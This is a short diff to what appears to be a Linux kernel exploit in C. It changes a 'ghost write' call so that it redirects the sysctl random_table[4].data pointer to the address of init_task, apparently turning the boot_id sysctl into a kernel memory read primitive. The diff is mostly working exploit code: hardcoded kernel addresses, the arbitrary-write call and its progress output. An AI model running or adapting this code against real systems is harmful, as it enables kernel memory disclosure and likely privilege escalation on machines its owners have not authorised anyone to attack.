@@ -107,16 +107,17 @@ static void run_worker_payload(void) {
          * Both target and value are WRITABLE, satisfying rb_set_parent side effect!
          */
         #define ADDR_RANDOM_BOOT_ID_DATA 0xffffffc012a4d198ULL
-        #define ADDR_SYSCTL_BOOTID_VAR   0xffffffc012d1d6e9ULL
+        #define ADDR_TARGET_READ         0xffffffc0129e0280ULL  /* init_task */
 
-        printf("[*] Testing Case 2 ghost write on writable sysctl random_table[4].data...\n");
+        printf("[*] Redirecting random_table[4].data to init_task (0x%llx)...\n",
+               (unsigned long long)ADDR_TARGET_READ);
         printf("[GHOST-WRITE-CALL] target=0x%llx value=0x%llx\n",
                (unsigned long long)ADDR_RANDOM_BOOT_ID_DATA,
-               (unsigned long long)ADDR_SYSCTL_BOOTID_VAR);
+               (unsigned long long)ADDR_TARGET_READ);
         fflush(stdout);
         int gw_ret = ghost_write_global(
             (uint64_t)ADDR_RANDOM_BOOT_ID_DATA,
-            (uint64_t)ADDR_SYSCTL_BOOTID_VAR);
+            (uint64_t)ADDR_TARGET_READ);
         printf("[GHOST-WRITE-RET] ret=%d\n", gw_ret);
         fflush(stdout);
 
